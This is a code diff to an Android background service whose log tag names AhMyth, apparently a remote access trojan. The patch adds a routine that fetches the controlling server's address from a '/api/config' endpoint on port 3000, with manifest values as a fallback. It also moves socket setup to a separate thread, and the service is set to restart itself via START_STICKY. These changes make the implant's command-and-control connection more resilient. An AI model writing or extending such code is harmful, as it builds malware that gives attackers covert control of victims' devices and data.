@@ -16,6 +16,13 @@ import androidx.annotation.RequiresApi;
 import androidx.core.app.NotificationCompat;
 import android.util.Log;
 
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
 public class MainService extends Service {
     // Usamos el tag "AhMyth" para todos los logs del servicio
     private static final String TAG = "AhMyth";
@@ -59,8 +66,11 @@ public class MainService extends Service {
         // Iniciamos en primer plano con notificación válida
         startForegroundIfNeeded();
 
-        // Inicializamos la conexión de socket
-        initSocket();
+        // Inicializamos la conexión de socket en un hilo separado para evitar NetworkOnMainThreadException
+        Thread socketThread = new Thread(() -> {
+            initSocket();
+        }, "SocketInitThread");
+        socketThread.start();
 
         // En caso de ser detenido por el sistema, reiniciar
         return START_STICKY;
@@ -111,14 +121,16 @@ public class MainService extends Service {
 
     /**
      * Lee la IP y el puerto desde los <meta-data> del AndroidManifest y conecta el socket.
+     * Ahora primero intenta obtener configuración dinámica desde /api/config.
      */
     private void initSocket() {
         Log.i(TAG, "Initializing socket connection");
 
         String serverIp = null;
         String serverPort = null;
+        String configUrl = null;
 
-        // 1) Extraemos el Bundle de meta-data
+        // 1) Primero, extraemos el Bundle de meta-data como fallback
         try {
             ApplicationInfo ai = getPackageManager().getApplicationInfo(
                 getPackageName(),
@@ -126,27 +138,48 @@ public class MainService extends Service {
             );
             Bundle meta = ai.metaData;
             if (meta != null) {
-                // 2) Obtenemos como Object y convertimos a String
                 Object ipObj   = meta.get("SERVER_IP");
                 Object portObj = meta.get("SERVER_PORT");
                 serverIp   = (ipObj   != null ? ipObj.toString()   : null);
                 serverPort = (portObj != null ? portObj.toString() : null);
 
-                // 3) Log intermedio para ver qué valores hemos leído
                 Log.i(TAG, "Meta-data read: SERVER_IP=" + serverIp
                            + " SERVER_PORT=" + serverPort);
+                
+                // Construir URL de configuración basada en los meta-data
+                if (!TextUtils.isEmpty(serverIp)) {
+                    configUrl = "http://" + serverIp + ":3000/api/config";
+                }
             }
         } catch (PackageManager.NameNotFoundException e) {
             Log.e(TAG, "Error reading meta-data", e);
         }
 
-        // 4) Validamos que no sean vacíos
+        // 2) Intentar obtener configuración dinámica del servidor
+        if (!TextUtils.isEmpty(configUrl)) {
+            Log.i(TAG, "Attempting to fetch dynamic config from: " + configUrl);
+            try {
+                String[] dynamicConfig = fetchDynamicConfig(configUrl);
+                if (dynamicConfig != null && dynamicConfig.length == 2) {
+                    serverIp = dynamicConfig[0];
+                    serverPort = dynamicConfig[1];
+                    Log.i(TAG, "Dynamic config fetched successfully: SERVER_IP=" + serverIp
+                               + " SERVER_PORT=" + serverPort);
+                } else {
+                    Log.w(TAG, "Failed to fetch dynamic config, using manifest values");
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Error fetching dynamic config, using manifest values: " + e.getMessage());
+            }
+        }
+
+        // 3) Validamos que no sean vacíos
         if (TextUtils.isEmpty(serverIp) || TextUtils.isEmpty(serverPort)) {
             Log.e(TAG, "Missing SERVER_IP or SERVER_PORT in manifest meta-data");
             return;
         }
 
-        // 5) Parse y conexión
+        // 4) Parse y conexión
         try {
             int port = Integer.parseInt(serverPort);
             Log.i(TAG, "Connecting to " + serverIp + ":" + port);
@@ -156,6 +189,60 @@ public class MainService extends Service {
         } catch (Exception e) {
             Log.e(TAG, "Socket connection failed", e);
         }
+    }
+
+    /**
+     * Intenta obtener la configuración dinámica del servidor.
+     * @param configUrl URL del endpoint de configuración
+     * @return Array con [SERVER_IP, SERVER_PORT] o null si falla
+     */
+    private String[] fetchDynamicConfig(String configUrl) {
+        HttpURLConnection conn = null;
+        BufferedReader reader = null;
+        try {
+            URL url = new URL(configUrl);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);  // 5 second timeout
+            conn.setReadTimeout(5000);
+            
+            int responseCode = conn.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                reader = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream())
+                );
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    response.append(line);
+                }
+                
+                // Parse JSON response
+                JSONObject json = new JSONObject(response.toString());
+                String ip = json.optString("SERVER_IP", null);
+                int portInt = json.optInt("SERVER_PORT", -1);
+                
+                if (!TextUtils.isEmpty(ip) && portInt > 0 && portInt <= 65535) {
+                    return new String[]{ip, String.valueOf(portInt)};
+                }
+            } else {
+                Log.w(TAG, "Config endpoint returned code: " + responseCode);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Exception fetching config: " + e.getMessage());
+        } finally {
+            if (reader != null) {
+                try {
+                    reader.close();
+                } catch (Exception e) {
+                    // Ignore close errors
+                }
+            }
+            if (conn != null) {
+                conn.disconnect();
+            }
+        }
+        return null;
     }
 
     @Override
